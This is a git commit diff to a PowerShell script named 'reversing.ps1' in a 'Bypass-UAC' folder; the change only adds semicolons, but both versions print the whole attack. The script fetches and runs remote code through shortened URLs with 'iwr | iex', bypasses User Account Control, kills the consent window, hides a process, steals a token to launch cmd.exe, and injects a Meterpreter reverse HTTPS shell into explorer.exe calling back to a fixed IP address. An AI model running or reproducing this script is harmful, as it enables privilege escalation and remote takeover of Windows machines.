5d880eed7b84488dc3df75cb5b98b100864dfb05
Az <z0rk@protonmail.com>
2017-12-01 14:52:23 +0100

    Update reversing.ps1

--- Bypass-UAC/reversing.ps1
+++ Bypass-UAC/reversing.ps1
@@ -1,17 +1,17 @@
-iwr https://goo.gl/x6ZcHM | iex
-iwr https://goo.gl/zggqse | iex
-iwr https://goo.gl/wxJHHq | iex
-iwr https://goo.gl/UJL3nD | iex
+iwr https://goo.gl/x6ZcHM | iex;
+iwr https://goo.gl/zggqse | iex;
+iwr https://goo.gl/wxJHHq | iex;
+iwr https://goo.gl/UJL3nD | iex;
 
 workflow Test
 {
     Parallel
     {
-        ${ Bypass-UAC -Method UacMethodNetOle32 }
-        ${ kill-window consent }
-        ${ hide-process mmc }
-        ${ UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id }
-        ${ Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443 }
+        ${ Bypass-UAC -Method UacMethodNetOle32 };
+        ${ kill-window consent };
+        ${ hide-process mmc };
+        ${ UAC-TokenMagic -BinPath C:\Windows\System32\cmd.exe -ProcPID (ps -Name mmc).id };
+        ${ Invoke-Shellcode -ProcessId $((ps -Name explorer.exe).id) -Payload windows/meterpreter/reverse_https -Lhost  45.76.178.205 -Lport 443 };
     }
 }
 
